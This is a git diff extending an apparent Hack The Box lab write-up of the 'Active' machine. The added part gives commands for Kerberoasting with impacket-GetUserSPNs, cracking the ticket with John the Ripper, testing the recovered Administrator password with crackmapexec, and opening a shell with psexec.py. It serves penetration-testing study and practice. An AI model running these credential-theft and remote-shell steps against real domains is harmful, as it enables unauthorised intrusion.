@@ -120,10 +120,43 @@ crackmapexec smb 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong
 >![[Pasted image 20250311023023.png]]
 
 
-- The share "users" if quite iteresting, because  inside "Default" folder we found some file named "NTUSER" this type of files contains recient access and credentials, we can use a tool like [[regripper]]
+- The share "users" if quite iteresting, because  inside "Default" folder we found some file named "NTUSER" this type of files contains recient access and credentials, we can use a tool like [[regripper]], but there are no useful information
 ```bash
 smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18 -c 'mget "Default"/*'
 ```
 >[!example]- Result
 >![[Pasted image 20250311115549.png]]
+
+# Exploitation
+- we can try to get a list of SPN (a identifier of a service instance, Kerberos use it to associate a service with a sign-in account) using [[impacket-GetUserSPNs]] , then we can crack it
+```bash
+impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -save -output GetUserSPN.out
+```
+>[!example]- Result
+>![[Pasted image 20250311154411.png]]
+
+- now we can use [[john the ripper]]
+```bash
+john GetUserSPN.out --wordlist=/usr/share/wordlists/rockyou.txt -format=krb5tgs
+```
+>[!example]- Result
+>![[Pasted image 20250311154747.png]]
+
+>Credentials:`Administrator:Ticketmaster1968`
+
+- Testing the credentials
+```bash
+crackmapexec smb 10.10.10.100 -u 'active.htb\Administrator' -p 'Ticketmaster1968' -x 'whoami /priv'
+```
+>[!example]- Result
+>![[Pasted image 20250311155536.png]]
+>![[Pasted image 20250311155538.png]]
+
+# Getting Access
+- we can [[psexec.py]] to get a interactive shell
+```bash
+psexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
+```
+>[!example]- Result
+>![[Pasted image 20250311162743.png]]
 
